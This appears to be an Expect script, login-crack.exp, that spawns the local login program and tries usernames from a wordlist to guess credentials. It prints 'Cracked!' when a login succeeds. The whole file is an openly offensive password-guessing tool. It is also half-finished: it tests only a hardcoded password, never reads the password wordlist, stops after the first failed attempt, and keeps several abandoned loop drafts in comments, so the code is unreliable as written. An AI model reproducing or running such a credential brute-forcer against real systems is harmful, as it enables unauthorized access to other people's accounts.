#!/usr/bin/expect
# Login incorrect
# login: Login timed out after 300 seconds

if { $argc != 2 } {

	puts "<Usage: user.dict pass.dict>"
	puts "./login-crack.exp user.lst pass.lst"
	exit

} else {

	set userlist [lindex $argv 0]
	set passlist [lindex $argv 1]

} 

if { [file isfile $userlist] == 1 && [file isfile $passlist] == 1 } {
	
	if { [file readable $userlist] == 1 && [file readable $passlist] ==1 } {
		} else { 

			puts "Files $userlist and $passlist are not both readable, please check their permissions"
		       	exit

			}

	} else {

	puts "$userlist and $passlist are not both files"
	puts "Please specify two dictionary/wordlist files"
	exit

}


#puts "test"
#exit

set userfile [open "$userlist" "r"]
set passfile [open "$passlist" "r"]

spawn /usr/bin/login
set pass "mypassword"
#set pass "dog"

while { [gets $userfile user] != -1 } {

expect "login:"			{ send "$user\n" }
expect "Password:" 		{ send "$pass\n" }
expect "Login incorrect"	{ break }
expect "Last login*"		{ puts "Cracked!  $user:$pass" }

#	expect {
#		"login:"		{ send "$user\n"  }
#		"Password:" 		{ send "$pass\n"; }
#		"Login incorrect"	{ break }
#		"Last login*"		{ puts "Cracked!  $user:$pass" }
#		".*$.*"			{ puts "Cracked!  $user:$pass" }
#		".*#.*"			{ puts "Cracked!  $user:$pass" }
#		}	
}				

#"Password:" 		{ puts "$user is a valid user name\n" }
							
	#	"Password:" 		{ send "$password\n" }
	#	"Last login*"		{ puts "Cracked! $user:$pass" }
	#	eof			{ exit }
#		}

#}

close $userfile
close $passfile

#	expect {
#		"login:"		{ send "$user\n" }
#		"Login incorrect"	{ exit }
#		"Password:" 		{ send "$password\n" }
#		"Last login*"		{ exit }
#		eof			{ exit }
#		}
#	}


#			while { [gets $passfile pass] != -1 } {
#			puts "$pass"

#				expect { 
#					"login:"		{ send "$user\n" }
#					"Password:" 		{ send "$pass\n" }
#					"Login incorrect"	{ break }
#					"Last login*"		{ puts "Cracked!  $user:$pass"; exit  }
#					}
#			}	
